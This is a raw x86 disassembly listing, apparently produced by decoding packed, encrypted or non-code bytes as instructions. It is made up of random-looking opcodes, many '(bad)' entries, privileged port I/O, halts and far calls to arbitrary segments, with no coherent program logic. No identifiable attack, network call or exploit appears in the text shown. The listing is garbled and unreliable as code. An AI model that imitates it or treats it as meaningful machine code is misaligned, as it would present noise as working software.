  41ffc9:	lods   eax,DWORD PTR ds:[esi]
  41ffca:	inc    esp
  41ffcb:	lahf   
  41ffcc:	stc    
  41ffcd:	(bad)
  41ffd1:	ret    
  41ffd2:	mov    ebp,0xc34d66d7
  41ffd7:	shl    BYTE PTR [esp+ecx*2-0xa1d153d],cl
  41ffde:	xor    eax,DWORD PTR [esi]
  41ffe0:	mov    esp,0x1d52f6a9
  41ffe5:	cli    
  41ffe6:	mov    ebp,0x678f057e
  41ffeb:	pushf  
  41ffec:	inc    ecx
  41ffed:	or     eax,0x5fac577
  41fff2:	pop    ss
  41fff3:	sbb    edx,DWORD PTR [eax-0x3e25c39d]
  41fff9:	jmp    DWORD PTR [eax-0x1c27b7b1]
  41ffff:	sub    al,0x59
  420001:	mov    BYTE PTR [edx+0x20],ah
  420004:	outs   dx,DWORD PTR ds:[esi]
  420005:	sbb    BYTE PTR [ecx-0x18],ch
  420008:	lock mov bh,0x28
  42000b:	je     0x42003b
  42000d:	cmp    DWORD PTR [ebx+0x2f386bf5],eax
  420013:	rcr    BYTE PTR [edx*2+0x1c2fa16d],cl
  42001a:	repz inc ecx
  42001c:	mov    edi,0xf55b0f59
  420021:	lahf   
  420022:	aam    0xb3
  420024:	inc    esi
  420025:	scas   eax,DWORD PTR es:[edi]
  420026:	and    BYTE PTR [edx+0x264227f1],0xff
  42002d:	(bad)  
  42002f:	dec    ecx
  420030:	in     al,0x76
  420032:	xor    esi,0x47
  420035:	xlat   BYTE PTR ds:[ebx]
  420036:	inc    eax
  420037:	dec    esp
  420038:	lahf   
  420039:	push   edi
  42003a:	mov    BYTE PTR [esi-0x6efb900f],ch
  420040:	add    cl,BYTE PTR [edx+0x1e]
  420043:	enter  0xdcbb,0xc2
  420047:	push   eax
  420048:	mov    ecx,DWORD PTR [ecx-0x37]
  42004b:	rol    BYTE PTR [esi+esi*2],0xfc
  42004f:	les    ebx,FWORD PTR [edx-0x37]
  420052:	adc    al,BYTE PTR [edx-0x2c]
  420055:	inc    esp
  420056:	pop    es
  420057:	xchg   edx,eax
  420058:	bnd je 0x4200a0
  42005b:	mov    ch,0xae
  42005d:	pop    eax
  42005e:	aaa    
  42005f:	mov    esi,0x88154442
  420064:	mov    ebx,0x23940dde
  420069:	hlt    
  42006a:	add    al,0x92
  42006c:	pop    edx
  42006d:	cli    
  42006e:	ret    0x863d
  420071:	scas   al,BYTE PTR es:[edi]
  420072:	cmc    
  420073:	sahf   
  420074:	enter  0xd377,0xc5
  420078:	stc    
  420079:	cmp    esp,DWORD PTR [esi-0x36c18c4b]
  42007f:	xchg   edi,eax
  420081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420082:	out    dx,al
  420083:	mov    ah,0xd9
  420085:	fsubr  QWORD PTR [ecx*4-0x259f7158]
  42008c:	lods   al,BYTE PTR ds:[esi]
  42008d:	sbb    BYTE PTR [eax+0x70],bl
  420090:	mov    al,0x88
  420092:	and    al,0x64
  420094:	push   esi
  420095:	cwde   
  420096:	adc    esp,edx
  420098:	clc    
  420099:	stos   BYTE PTR es:[edi],al
  42009a:	inc    esp
  42009b:	mov    al,ds:0x2511ae68
  4200a0:	mov    cl,0xe6
  4200a2:	pusha  
  4200a3:	xor    esi,DWORD PTR ds:0x8bed6c99
  4200a9:	jns    0x42010d
  4200ab:	fsub   DWORD PTR [ebx+0x2b]
  4200ae:	push   ss
  4200af:	push   cs
  4200b0:	ins    BYTE PTR es:[edi],dx
  4200b1:	jns    0x4200b0
  4200b3:	jecxz  0x420050
  4200b5:	push   edx
  4200b6:	or     eax,0xdabeb21a
  4200bb:	std    
  4200bc:	enter  0xe4ca,0x9c
  4200c0:	push   esp
  4200c1:	sub    DWORD PTR [esi],edx
  4200c3:	xchg   BYTE PTR [ecx],al
  4200c5:	jle    0x420065
  4200c7:	sbb    DWORD PTR [ecx+0x1aab23ee],edx
  4200cd:	popa   
  4200ce:	sub    eax,0x8cab45a4
  4200d3:	mov    al,ds:0x2d863dc9
  4200d8:	dec    edi
  4200d9:	dec    ebx
  4200da:	aas    
  4200db:	das    
  4200dc:	mov    dh,0xaf
  4200de:	mov    eax,0x71cbdccf
  4200e3:	pop    es
  4200e4:	mov    ecx,0xda555a53
  4200e9:	xor    DWORD PTR [esi],0x66f49f8
  4200ef:	xor    DWORD PTR [eax+0x1199d8c8],esi
  4200f5:	mov    dl,0x97
  4200f7:	call   0x8fcb:0x1f845ee6
  4200fe:	loope  0x4200cd
  420100:	jns    0x4200b8
  420102:	retf   
  420103:	jmp    0x42014d
  420105:	dec    esi
  420106:	xchg   esi,eax
  420107:	adc    ah,BYTE PTR [edi+0x17c1ab1f]
  42010d:	out    0xd0,eax
  42010f:	jne    0x420188
  420111:	sar    BYTE PTR [esi+ecx*1],0x45
  420115:	outs   dx,BYTE PTR ds:[esi]
  420116:	mov    ds,WORD PTR [edi+0x1bf925f7]
  42011c:	cmp    eax,DWORD PTR [eax-0x16498459]
  420122:	ins    BYTE PTR es:[edi],dx
  420123:	js     0x4200a6
  420125:	sbb    al,0x29
  420127:	pop    ecx
  420128:	add    al,BYTE PTR [esi-0xd]
  42012b:	xchg   esp,eax
  42012c:	dec    ebp
  42012d:	(bad)  
  42012e:	(bad)  
  42012f:	pop    edx
  420130:	clc    
  420131:	jmp    0x4200bf
  420133:	mov    dh,0x80
  420135:	ret    
  420136:	adc    ah,BYTE PTR [edx-0x147eeedd]
  42013c:	pop    ebx
  42013d:	jmp    0xcba1dc34
  420142:	fs std 
  420144:	dec    edi
  420145:	rol    DWORD PTR [ecx],0x28
  420148:	sti    
  420149:	xor    DWORD PTR [esi],0x4485bd80
  42014f:	clc    
  420150:	sub    DWORD PTR [esi+eax*4],esp
  420153:	sub    DWORD PTR [ebx-0x1d],esi
  420156:	xor    bh,cl
  420158:	cmc    
  420159:	add    BYTE PTR [eax],al
  42015b:	add    BYTE PTR [ebx+0x7d7539cf],bh
  420161:	idiv   edi
  420163:	iret   
  420164:	std    
  420165:	mov    ecx,DWORD PTR [esi+0x304abd0f]
  42016b:	fild   QWORD PTR [edi-0x7afffe83]
  420171:	add    al,BYTE PTR [eax]
  420173:	add    al,bh
  420175:	dec    ebx
  420176:	pusha  
  420177:	pop    ss
  420178:	inc    ecx
  420179:	xchg   ebx,eax
  42017a:	cmp    BYTE PTR [edi-0x1b892120],ch
  420180:	mov    ds:0xb6a7a6f8,al
  420185:	push   esi
  420186:	aam    0xf3
  420188:	xchg   ebx,eax
  420189:	xor    bl,cl
  42018b:	call   0x7b88d01c
  420190:	fucom  st(6)
  420192:	fs dec ecx
  420194:	mov    eax,0x7382f712
  420199:	inc    ecx
  42019a:	sub    eax,0xe25a748f
  42019f:	ficomp WORD PTR [edx]
  4201a1:	lods   eax,DWORD PTR ds:[esi]
  4201a2:	xchg   ebx,eax
  4201a3:	outs   dx,BYTE PTR ds:[esi]
  4201a4:	pop    eax
  4201a5:	push   edi
  4201a6:	aam    0x84
  4201a8:	push   esp
  4201a9:	retf   0x3393
  4201ac:	and    eax,DWORD PTR [eax+eax*2-0x47]
  4201b0:	push   ds
  4201b1:	stc    
  4201b2:	fmul   DWORD PTR [esi+0x51]
  4201b5:	mov    cl,0xae
  4201b7:	int3   
  4201b8:	shr    BYTE PTR [edx+0x737a19f],1
  4201be:	(bad)
  4201c1:	or     dl,ah
  4201c3:	adc    edx,DWORD PTR [edi]
  4201c5:	inc    eax
  4201c6:	js     0x420211
  4201c8:	mov    ecx,0xe0642f1a
  4201cd:	cmp    DWORD PTR [edi-0x122e1421],edi
  4201d3:	add    eax,0x5254cd91
  4201d8:	or     al,0x4b
  4201da:	and    cl,ch
  4201dc:	es pushf 
  4201de:	adc    DWORD PTR [edi-0x30d5b18d],0x52f5e62f
  4201e8:	aas    
  4201e9:	add    al,0x72
  4201eb:	cdq    
  4201ec:	and    cl,BYTE PTR [eax]
  4201ee:	cwde   
  4201ef:	into   
  4201f0:	inc    esp
  4201f1:	cmc    
  4201f2:	in     eax,0x4d
  4201f4:	popa   
  4201f5:	cs dec ecx
  4201f7:	adc    al,0xc2
  4201f9:	inc    esi
  4201fa:	loope  0x420203
  4201fc:	dec    edx
  4201fd:	push   esi
  4201fe:	jg     0x420237
  420200:	jbe    0x420201
  420202:	fild   QWORD PTR [ecx-0x5c]
  420205:	sub    bl,BYTE PTR [edi-0x4f]
  420208:	jmp    0x98478459
  42020d:	ja     0x4201d2
  42020f:	fs aad 0xbe
  420212:	loope  0x420290
  420214:	retf   0xc938
  420217:	cmp    dh,BYTE PTR [edx+0x42beb74d]
  42021d:	inc    esp
  42021e:	stos   BYTE PTR es:[edi],al
  42021f:	data16 fimul DWORD PTR [eax]
  420222:	mov    cl,0x15
  420224:	stc    
  420225:	repnz dec eax
  420227:	stos   DWORD PTR es:[edi],eax
  420228:	inc    edi
  420229:	push   esp
  42022a:	push   esi
  42022b:	outs   dx,DWORD PTR ds:[esi]
  42022c:	sub    cl,0x7b
  42022f:	pushf  
  420230:	xchg   ecx,eax
  420231:	aam    0xa
  420233:	jne    0x42026a
  420235:	xchg   ebx,eax
  420236:	call   0xbf790518
  42023b:	data16 fucomi st,st(6)
  42023e:	sub    dl,BYTE PTR [ecx]
  420240:	mov    eax,ds:0x708bcd21
  420245:	shl    edx,0x8a
  420248:	call   0xc5e1:0xfe8f8693
  42024f:	inc    edi
  420250:	or     ch,bl
  420252:	sub    DWORD PTR [ecx+0x40],edx
  420255:	push   edi
  420256:	aad    0xfe
  420258:	dec    ecx
  420259:	cmp    cl,BYTE PTR [edi]
  42025b:	jne    0x4201de
  42025d:	push   edx
  42025e:	cs addr16 push ebx
  420261:	adc    al,0x56
  420263:	jl     0x420230
  420265:	in     eax,0x42
  420267:	add    eax,0x97a05a91
  42026c:	fld    QWORD PTR [esi]
  42026e:	dec    esi
  42026f:	cdq    
  420270:	lock das 
  420272:	adc    esi,ebp
  420274:	mov    ch,dh
  420276:	cmp    al,0xf7
  420278:	cmp    al,0x33
  42027a:	rcl    BYTE PTR [ebp+0x2a8d5a9c],1
  420280:	les    esi,FWORD PTR [edx]
  420282:	daa    
  420283:	pop    ds
  420284:	add    eax,0x664faca5
  420289:	xchg   al,bh
  42028b:	push   edx
  42028c:	fist   DWORD PTR [eax]
  42028e:	cld    
  42028f:	in     al,dx
  420290:	or     DWORD PTR [edi-0x65],ebp
  420293:	pop    ecx
  420294:	je     0x4202ec
  420296:	rol    DWORD PTR [esi],0x5c
  420299:	dec    esi
  42029a:	pop    es
  42029b:	mov    bl,BYTE PTR [ebp-0x76db5b8c]
  4202a1:	xchg   edi,eax
  4202a2:	jbe    0x420317
  4202a4:	add    DWORD PTR [edi],eax
  4202a6:	push   ebp
  4202a7:	xor    eax,0xdc822b34
  4202ac:	mov    bh,0x4a
  4202ae:	mov    ebx,DWORD PTR [esi+0x2a]
  4202b1:	lock ret 
  4202b3:	mov    bl,0x79
  4202b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b6:	sahf   
  4202b7:	and    DWORD PTR [ebx+0x38],edi
  4202ba:	loopne 0x4202ae
  4202bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202bd:	xor    esi,DWORD PTR [ebx+0x211e1ea1]
  4202c3:	scas   eax,DWORD PTR es:[edi]
  4202c4:	xor    DWORD PTR [esi],ecx
  4202c6:	xor    esi,DWORD PTR [ebp-0x14]
  4202c9:	call   0xbea:0xdcfb480c
  4202d0:	imul   edx,DWORD PTR [ebp+0x2c784ed2],0xe9ab8b4f
  4202da:	or     ch,BYTE PTR [eax]
  4202dc:	cwde   
  4202dd:	dec    eax
  4202de:	jp     0x42027b
  4202e0:	iret   
  4202e1:	add    bl,BYTE PTR [edi]
  4202e3:	add    al,0xf8
  4202e5:	rcl    cl,1
  4202e7:	cwde   
  4202e8:	mov    ds,WORD PTR ds:0xbfcce48b
  4202ee:	cmc    
  4202ef:	adc    al,0x32
  4202f1:	pop    esi
  4202f2:	in     al,dx
  4202f3:	push   cs
  4202f4:	xchg   ecx,eax
  4202f5:	pop    es
  4202f6:	fbstp  TBYTE PTR [esi]
  4202f8:	iret   
  4202f9:	cwde   
  4202fa:	mov    bl,0x9b
  4202fc:	outs   dx,BYTE PTR ds:[esi]
  4202fd:	imul   edx,DWORD PTR [edi],0x3c3baae5
  420303:	fld    QWORD PTR [esi+0x24447d80]
  420309:	mov    BYTE PTR [ebp+0x1047f885],dh
  42030f:	push   ebx
  420310:	mov    gs,WORD PTR [edi+0x18]
  420313:	dec    ecx
  420314:	push   0x51
  420316:	aaa    
  420317:	mov    dh,0xfc
  420319:	push   0xf709984f
  42031e:	dec    eax
  42031f:	pushf  
  420320:	xchg   ebp,eax
  420321:	adc    DWORD PTR [edx+eax*4],0xd
  420325:	loop   0x42038d
  420327:	out    0x54,al
  420329:	je     0x420342
  42032b:	or     al,0xe5
  42032d:	mov    edi,0xb954ee55
  420332:	xchg   ebp,eax
  420333:	stc    
  420334:	xor    bl,cl
  420336:	das    
  420337:	in     al,dx
  420338:	dec    edi
  420339:	push   eax
  42033a:	jb     0x4202eb
  42033c:	mov    cx,0xce6d
  420340:	jge    0x420314
  420342:	sub    esi,esi
  420344:	sbb    eax,DWORD PTR [esi]
  420346:	leave  
  420347:	and    al,0x0
  420349:	repnz das 
  42034b:	repnz test BYTE PTR [eax],dh
  42034e:	fiadd  WORD PTR [ebx+0x22c2c4e9]
  420354:	mov    ds:0xeada18d8,al
  420359:	push   ebp
  42035a:	(bad)  
  42035c:	in     al,0x41
  42035e:	adc    bh,ah
  420360:	(bad)  
  420361:	and    eax,0x651c0539
  420366:	inc    ecx
  420367:	sub    ebx,eax
  420369:	popa   
  42036a:	dec    eax
  42036b:	arpl   WORD PTR [ebx+0x49e76c5f],dx
  420371:	push   ss
  420372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420373:	fisubr WORD PTR [edi+esi*4-0x30d252db]
  42037a:	mov    esi,0x52eb18e6
  42037f:	sub    ebx,DWORD PTR [edx-0x1a6f08ff]
  420385:	add    DWORD PTR gs:[edx-0x4a7f1fcb],ebp
  42038c:	aas    
  42038d:	xchg   ebp,eax
  42038e:	mov    ch,0x49
  420390:	out    dx,al
  420391:	in     eax,0x6a
  420393:	std    
  420394:	je     0x4203d1
  420396:	xchg   edi,eax
  420397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420398:	jle    0x4203ed
  42039a:	jo     0x42037f
  42039c:	ss pop eax
  42039e:	jecxz  0x4203df
  4203a0:	xchg   edx,eax
  4203a1:	scas   eax,DWORD PTR es:[edi]
  4203a2:	inc    esp
  4203a3:	dec    esi
  4203a4:	ja     0x420338
  4203a6:	jge    0x420422
  4203a8:	push   ss
  4203a9:	mov    eax,DWORD PTR [ebp+0x1f]
  4203ac:	sub    BYTE PTR [esi+edx*4],bh
  4203af:	mov    ch,0xdf
  4203b1:	mov    ah,0xfd
  4203b3:	mov    al,ds:0x5bfa5025
  4203b8:	push   0xffffff87
  4203ba:	mov    dh,0x5c
  4203bc:	adc    eax,0x6c758ba6
  4203c1:	xor    al,BYTE PTR [edx]
  4203c3:	cs dec eax
  4203c5:	mov    dh,0x5a
  4203c7:	in     al,0x1d
  4203c9:	in     eax,dx
  4203ca:	adc    al,0xe6
  4203cc:	cli    
  4203cd:	les    eax,FWORD PTR [esi+0x56]
  4203d0:	inc    eax
  4203d1:	jecxz  0x42039d
  4203d3:	aas    
  4203d4:	sbb    edx,DWORD PTR [esi]
  4203d6:	dec    edx
  4203d7:	mov    WORD PTR [esi],gs
  4203d9:	or     DWORD PTR [edi],edx
  4203db:	inc    edi
  4203dc:	xor    ah,bl
  4203de:	jmp    0xd7eaf4ad
  4203e3:	mov    dh,0xcc
  4203e5:	mov    ebp,ecx
  4203e7:	jae    0x420461
  4203e9:	adc    eax,0xa229d69c
  4203ee:	addr16 add bh,cl
  4203f1:	out    dx,al
  4203f2:	mov    ebp,0x30dd3f80
  4203f7:	arpl   WORD PTR [ebx-0x12000000],bx
  4203fd:	ret    0x2d9d
  420400:	mov    ebp,0x3fc3fe7f
  420405:	out    dx,eax
  420406:	mov    edi,0x1eb33437
  42040b:	fs xor al,0x80
  42040e:	add    DWORD PTR [eax],eax
  420410:	test   DWORD PTR [edx],eax
  420412:	add    BYTE PTR [eax],al
  420414:	cmp    cl,BYTE PTR [esi-0x72]
  420417:	inc    eax
  420418:	lock fs xor bl,bl
  42041c:	jae    0x420474
  42041e:	pop    ecx
  42041f:	ds or  eax,0x406ee9ce
  420425:	retf   
  420426:	dec    esp
  420427:	mov    cl,0x60
  420429:	or     eax,0xe2ea8e19
  42042e:	add    al,0x15
  420430:	fcomp  QWORD PTR [edi+0x3a790801]
  420436:	lock mov dh,0x2d
  420439:	fsubr  DWORD PTR [eax]
  42043b:	repz enter 0x84f4,0x9b
  420440:	mov    edx,0x40d150e5
  420445:	cli    
  420446:	xor    BYTE PTR [ecx-0x38],0x4d
  42044a:	lea    edx,[esi+eiz*8+0x338778c1]
  420451:	and    BYTE PTR [ecx+0xe2aa338],bl
  420457:	stos   DWORD PTR es:[edi],eax
  420458:	fbld   TBYTE PTR [edi-0x54]
  42045b:	xor    eax,0xb05da5f9
  420460:	xchg   esp,eax
  420461:	(bad)  
  420462:	pop    ecx
  420463:	js     0x4203e5
  420465:	in     al,dx
  420466:	in     eax,dx
  420467:	push   0x3b
  420469:	stc    
  42046a:	sub    DWORD PTR [eax+edx*2],eax
  42046d:	sub    DWORD PTR [ecx+edx*8],edx
  420470:	sbb    BYTE PTR [ebx+ecx*2],0xa7
  420474:	mov    DWORD PTR [edi+0x62],ecx
  420477:	bound  ecx,QWORD PTR [ebp-0x43d5aa5a]
  42047d:	xchg   ebx,eax
  42047e:	imul   DWORD PTR [eax-0x7]
  420481:	outs   dx,DWORD PTR ds:[esi]
  420482:	pop    es
  420483:	repz cli 
  420485:	jecxz  0x4204fc
  420487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420488:	repz popa 
  42048a:	mov    ecx,0x4e8c83c2
  42048f:	mov    esp,0x5a761937
  420494:	scas   al,BYTE PTR es:[edi]
  420495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420496:	dec    eax
  420497:	fidiv  DWORD PTR [eax+0x68086044]
  42049d:	pop    eax
  42049e:	inc    ebp
  42049f:	pop    ebp
  4204a0:	mov    ebp,0x3a0d638c
  4204a5:	stc    
  4204a6:	push   ds
  4204a7:	out    dx,al
  4204a8:	xchg   esp,eax
  4204a9:	xchg   esi,eax
  4204aa:	(bad)  
  4204ab:	retf   0x8ce2
  4204ae:	sub    esp,DWORD PTR [ebp+0x4e]
  4204b1:	es jmp 0x49a5:0xdbb6eb8c
  4204b9:	xchg   ecx,eax
  4204ba:	ins    DWORD PTR es:[edi],dx
  4204bb:	push   eax
  4204bc:	mov    esi,0x687a840f
  4204c1:	push   esi
  4204c2:	int3   
  4204c3:	mov    WORD PTR [esi],?
  4204c5:	std    
  4204c6:	(bad)  
  4204c7:	ss inc eax
  4204c9:	cmp    eax,0x1780f4b8
  4204ce:	loope  0x420492
  4204d0:	inc    ecx
  4204d1:	fs dec ebp
  4204d3:	lods   eax,DWORD PTR ds:[esi]
  4204d4:	(bad)
  4204d7:	(bad)
  4204da:	lods   al,BYTE PTR ds:[esi]
  4204db:	sub    ch,BYTE PTR [edx+0x44a24715]
  4204e1:	mov    ebx,0xa43d38a
  4204e6:	cmc    
  4204e7:	cmp    BYTE PTR [esi+0x4b],ch
  4204ea:	sub    eax,0x45beda97
  4204ef:	pop    es
  4204f0:	and    al,0x1c
  4204f2:	mov    bh,BYTE PTR [esi-0x72]
  4204f5:	xchg   edx,eax
  4204f6:	into   
  4204f7:	mov    ah,0x16
  4204f9:	dec    ebx
  4204fa:	push   esi
  4204fb:	add    BYTE PTR [edx+0x33],0xd5
  4204ff:	jp     0x420507
  420501:	and    al,al
  420503:	mov    esi,0x5b1b138d
  420508:	push   0x11
  42050a:	adc    edx,DWORD PTR [ebx+0x20]
  42050d:	cmp    BYTE PTR [edx+0x4fa82ddf],0x5f
  420514:	push   edi
  420515:	iret   
  420516:	stos   BYTE PTR es:[edi],al
  420517:	in     eax,dx
  420518:	ror    BYTE PTR [edx+0x31],0x51
  42051c:	aam    0x9d
  42051e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42051f:	pop    edx
  420520:	stc    
  420521:	rcr    DWORD PTR fs:[edx+eiz*8+0x52dfd6f1],cl
  420529:	idiv   DWORD PTR [ecx]
  42052b:	push   ss
  42052c:	stos   BYTE PTR es:[edi],al
  42052d:	shr    DWORD PTR [ecx-0x45],1
  420530:	retf   0x98c7
  420533:	sub    al,BYTE PTR [ebx]
  420535:	adc    ebx,DWORD PTR [esi]
  420537:	outs   dx,DWORD PTR ds:[esi]
  420538:	or     al,bl
  42053a:	xchg   esp,eax
  42053b:	dec    esp
  42053c:	mov    ch,0x9d
  42053e:	hlt    
  42053f:	or     al,0x47
  420541:	jo     0x42052c
  420543:	jns    0x420597
  420545:	mov    ds:0x4d03d956,eax
  42054a:	pop    edx
  42054b:	(bad)
  42054f:	or     al,0x25
  420551:	bound  ebx,QWORD PTR [ebx-0x11002cd6]
  420557:	inc    edx
  420558:	jne    0x42052b
  42055a:	ret    0x1982
  42055d:	into   
  42055e:	mov    edx,0x288579d1
  420563:	xor    DWORD PTR [eax+0x3cb520a2],esp
  420569:	pop    ecx
  42056a:	mov    WORD PTR [edi+0x69],ss
  42056d:	cmp    BYTE PTR [eax],bl
  42056f:	mov    eax,0x18c89ae9
  420574:	iret   
  420575:	jbe    0x4205cc
  420577:	mov    eax,0x7d9cddae
  42057c:	xor    al,0x72
  42057e:	and    eax,0x46139a95
  420583:	mov    bl,0xd2
  420585:	inc    ebp
  420586:	loopne 0x4205c4
  420588:	add    edx,eax
  42058a:	sahf   
  42058b:	loop   0x42050f
  42058d:	sbb    ch,BYTE PTR [ebx+0x7a]
  420590:	sahf   
  420591:	sub    eax,0x1dd1382b
  420596:	jmp    0x6d877fc3
  42059b:	jle    0x42052b
  42059d:	and    DWORD PTR [esi-0x6f45c19a],ebp
  4205a3:	shr    eax,0x56
  4205a6:	mov    ah,0x44
  4205a8:	add    esp,esi
  4205aa:	repz xor BYTE PTR [ebp-0x51],0xd0
  4205af:	and    DWORD PTR gs:[ebx+ebp*1+0x42e1670c],edi
  4205b7:	(bad)  
  4205b8:	pushf  
  4205b9:	jne    0x420634
  4205bb:	or     DWORD PTR [eax+0x2a1ebb0c],edx
  4205c1:	jb     0x420545
  4205c3:	xor    eax,0x9b393179
  4205c8:	and    edi,DWORD PTR [ebx+0x4f03d7ca]
  4205ce:	lahf   
  4205cf:	or     ebp,DWORD PTR [eax-0x45]
  4205d2:	(bad)  
  4205d3:	in     eax,0x40
  4205d5:	xchg   edx,eax
  4205d6:	dec    DWORD PTR [eax]
  4205d8:	inc    ebp
  4205d9:	mov    eax,0x6a3bc819
  4205de:	dec    esp
  4205df:	icebp  
  4205e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e1:	aad    0xac
  4205e3:	(bad)  
  4205e4:	call   0x8acd128f
  4205e9:	add    eax,0xad9424af
  4205ee:	mov    al,0xf
  4205f0:	xchg   ebp,eax
  4205f1:	out    dx,al
  4205f2:	gs push es
  4205f4:	push   ecx
  4205f5:	ss aas 
  4205f7:	shr    BYTE PTR [edx-0x38dba8b7],cl
  4205fd:	sbb    ebx,eax
  4205ff:	imul   esi,DWORD PTR [edi+0x47],0x76065733
  420606:	arpl   WORD PTR [esi],cx
  420608:	mov    DWORD PTR [eax],ebx
  42060a:	aam    0x9a
  42060c:	push   es
  42060d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42060e:	jae    0x4205e6
  420610:	mov    ecx,0x982c1092
  420615:	cmp    BYTE PTR [edi+0x5a],dh
  420618:	repnz pop eax
  42061a:	push   ds
  42061b:	enter  0x3c35,0x8e
  42061f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420620:	push   esi
  420621:	dec    dx
  420623:	dec    ecx
  420624:	sub    eax,0x2360101e
  420629:	daa    
  42062a:	jg     0x4205c3
  42062c:	pop    ebp
  42062d:	fsubrp st(7),st
  42062f:	dec    eax
  420630:	mov    eax,0xfa7120f1
  420635:	jge    0x42069c
  420637:	mov    DWORD PTR [eax],esi
  420639:	daa    
  42063a:	push   cs
  42063b:	out    dx,al
  42063c:	clc    
  42063d:	or     al,0xa8
  42063f:	or     eax,esp
  420641:	xor    ch,bh
  420643:	mov    eax,0xd070e6de
  420648:	fldcw  WORD PTR [ecx]
  42064a:	inc    esp
  42064b:	pop    esi
  42064c:	add    eax,0x60ca190a
  420651:	pop    ebx
  420652:	sbb    eax,DWORD PTR [ebx-0x75ba5cfe]
  420658:	mov    edi,0x5bfe54ec
  42065d:	adc    bh,ah
  42065f:	ins    DWORD PTR es:[edi],dx
  420660:	sub    BYTE PTR [ebp+0x6256d3d9],bh
  420666:	outs   dx,BYTE PTR ds:[esi]
  420667:	ret    0xabd1
  42066a:	sub    al,0xb8
  42066c:	or     eax,edx
  42066e:	cwde   
  42066f:	add    cl,BYTE PTR [edi+0x1d]
  420672:	sti    
  420673:	ja     0x4206ad
  420675:	enter  0xe008,0x1
  420679:	xchg   DWORD PTR [edx],esi
  42067b:	jl     0x4206b0
  42067d:	mov    ebx,0x6c87ffe3
  420682:	push   ebx
  420683:	or     ah,dh
  420685:	mov    WORD PTR [ecx+0xf376b88],gs
  42068b:	jns    0x4206ca
  42068d:	push   edx
  42068e:	pop    ecx
  42068f:	(bad)  
  420690:	pop    ds
  420691:	inc    ebp
  420692:	imul   eax,DWORD PTR [eax+0x6a86bd14],0x46
  42069c:	push   ebx
  42069d:	(bad)  
  42069e:	(bad)  
  42069f:	push   esi
  4206a0:	(bad)  
  4206a1:	jle    0x42069e
  4206a3:	xlat   BYTE PTR ds:[ebx]
  4206a4:	outs   dx,DWORD PTR ds:[esi]
  4206a5:	mov    ah,0x77
  4206a7:	call   0x82b9:0xfc5d38c8
  4206ae:	add    DWORD PTR [eax],eax
  4206b0:	test   DWORD PTR [edx],eax
  4206b2:	add    BYTE PTR [eax],al
  4206b4:	test   eax,0xd9d9959a
  4206b9:	shl    DWORD PTR [eax],0xe
  4206bc:	sbb    BYTE PTR [ebp+0x4a],dl
  4206bf:	test   DWORD PTR [edx-0x12],edi
  4206c2:	fisub  WORD PTR [edi]
  4206c4:	retf   0x8fae
  4206c7:	mov    ds:0x35cf5ac2,al
  4206cc:	out    dx,eax
  4206cd:	inc    edi
  4206ce:	or     dl,BYTE PTR [esi]
  4206d0:	jb     0x420737
  4206d2:	sbb    edi,DWORD PTR [esi+0x3f]
  4206d5:	ja     0x420730
  4206d7:	and    eax,DWORD PTR [esi+0x27]
  4206da:	dec    eax
  4206db:	dec    esp
  4206dc:	adc    cl,al
  4206de:	sub    DWORD PTR [esi-0x22f813e],ebp
  4206e4:	push   ebp
  4206e5:	add    BYTE PTR [ebx-0x63],bl
  4206e8:	xor    bl,ch
  4206ea:	nop
  4206eb:	fs push ebx
  4206ed:	cmp    eax,0xfe4781a6
  4206f2:	and    eax,0x76425cb2
  4206f7:	add    eax,0xa5a43202
  4206fc:	mov    esi,0x418ec86a
  420701:	mov    edi,0xc1ce4b38
  420706:	stos   DWORD PTR es:[edi],eax
  420707:	retf   
  420708:	fimul  WORD PTR [eax-0x54]
  42070b:	popa   
  42070c:	jbe    0x42077e
  42070e:	cli    
  42070f:	mov    edi,DWORD PTR [eax-0x7e]
  420712:	mov    ah,0x47
  420714:	sti    
  420715:	jecxz  0x4206d3
  420717:	xchg   ch,dl
  420719:	int3   
  42071a:	out    dx,al
  42071b:	xchg   ebp,eax
  42071c:	out    dx,al
  42071d:	adc    DWORD PTR [edx],esi
  42071f:	daa    
  420720:	jecxz  0x4206f7
  420722:	mov    ah,0x38
  420724:	xor    al,0x69
  420726:	cld    
  420727:	fmul   st,st(7)
  420729:	pop    ecx
  42072a:	out    0x70,eax
  42072c:	fstp   DWORD PTR [edi-0x50]
  42072f:	and    edx,DWORD PTR [esp+eax*2]
  420732:	push   eax
  420733:	fsub   st,st(4)
  420735:	iret   
  420736:	sub    DWORD PTR [eax+0x48],edi
  420739:	dec    edx
  42073a:	adc    al,0xd5
  42073c:	inc    edi
  42073d:	in     al,dx
  42073e:	data16 mov dl,BYTE PTR [ecx]
  420741:	xchg   ebx,eax
  420742:	adc    eax,0xfd644307
  420747:	cld    
  420748:	packsswb mm3,QWORD PTR [eax]
  42074b:	push   cs
  42074c:	mov    DWORD PTR [ebp-0x697d8e83],ecx
  420752:	addr16 jne 0x42071a
  420755:	push   0x68f05f22
  42075a:	xchg   edx,eax
  42075b:	cwde   
  42075c:	ja     0x4206e2
  42075e:	mov    BYTE PTR [edx+0x7],bh
  420761:	push   ss
  420762:	or     eax,0x8ec68eee
  420767:	ds inc esp
  420769:	cwde   
  42076a:	ror    DWORD PTR [ecx],1
  42076c:	mov    dl,0x43
  42076e:	add    cl,BYTE PTR ds:0xd08e3e7
  420774:	add    DWORD PTR [ecx],0xff9437c1
  42077a:	mov    esi,0xc1fef5f1
  42077f:	pop    ebp
  420780:	push   edi
  420781:	jo     0x4207f2
  420783:	shr    BYTE PTR [esi+0x45e9a93c],cl
  420789:	out    0xf8,al
  42078b:	adc    ecx,DWORD PTR [edx]
  42078d:	mov    dl,0x9
  42078f:	in     al,dx
  420790:	call   0x314e:0x58269bb8
  420797:	sahf   
  420798:	mov    dh,0x6
  42079a:	and    BYTE PTR [edi-0x1f847b14],ah
  4207a0:	hlt    
  4207a1:	shl    DWORD PTR [edx-0x48],1
